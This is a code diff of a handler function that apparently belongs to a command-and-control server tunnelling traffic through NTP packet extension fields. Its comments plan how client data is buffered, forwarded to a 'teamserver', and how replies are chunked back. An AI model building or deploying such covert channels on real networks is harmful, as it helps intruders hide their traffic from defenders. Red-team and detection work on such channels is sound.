@@ -233,47 +233,6 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
     }
 
-    //likely depracted
-    else if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
-        std::cout << "----------------------" << std::endl;
-        std::cout << "PCKT: sizePacket " << std::endl;
-        std::cout << "----------------------" << std::endl;
-        printHexVectorPacket(ntpPacket.getRawPacket());
-
-        std::cout << "[?] sizePacket recieved, starting chunking" << std::endl;
-
-        uint32_t clientID = generateClientID();
-        std::cout << "Theoretical Client ID: " << clientID << std::endl;
-
-        //placeholder for ID
-        std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);
-        //std::vector<uint8_t> clientIdVector = { 0x00,0x00,0x00,0x00 };
-
-        //create NTP packet for response, with client ID included
-        NTPPacket idPacket;
-
-        idPacket.addExtensionField(
-            NtpExtensionField::idPacket,
-            clientIdVector,
-            Client::emptyClientId //using empty sesion ID to fit spec
-
-        );
-
-        std::vector<uint8_t> rawPacket = idPacket.getPacket();
-
-        sendNtpPacket(
-            client_addr,
-            sock,
-            rawPacket
-        );
-
-        //pass to chunker func
-        //pass socket, recv from, size, etc.
-
-        //temp send back normal packet
-        //sendNormalNtpPacket(client_addr, sock);
-
-    }
 
     /*
     Get ID packet - aka the first thing a client needs to call to 
@@ -327,6 +286,43 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             rawPacket
         );
 
+    }
+
+    //Called first to comms size, sets up data in client class for incoming message
+    /*
+    
+        sets client.inboundMessageSize
+        server knows to stop reading/writing packets here after this size? when that # is hit, then forward to teamserver.
+    */
+    else if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: sizePacket " << std::endl;
+        std::cout << "----------------------" << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
+
+        std::cout << "[?] sizePacket recieved" << std::endl;
+
+        //parse packet, get ClientID
+
+        //lookup client class. Should exist.
+
+        //Add sizse of message to client class, to fromClientBufferSize
+
+        //(in dataForTeamserver) continue to append to fromClientBuffer until data == fromClientBufferSize, then send to teamserver.
+
+        //need to fiugre out how to get data back from TS now too. 
+        //maybe a dedicated flag with "any data?" checkin. Both know size, both can calc
+
+        //lookign at ICMP code, after we send that, we immediatly read from the teamserver frame, 
+        //so maybe it goes
+        //1. Get all data from client, send some sort of "ok" message back. 
+        //2. When all data is retrieved, send to TS
+        //3. Save TS resposne in client class
+        //4. send 1 sizePacket, then dataFromTeamserver packets (chunked) back (client must send a "giveMeTsResponse" packet so it's outbound), with the data from the TS in the response.
+            //need to edit chunker on client side for a "send chunked" and "recieve chunked"
+            //size packet is so the client knows how big it is inbound.
+        //Note, don't have to re-create a chunker here, can use the assumption of one packet per checkin, then just continue to send back by popping off the queue, like
+        //we did for payload.
     }
 
 
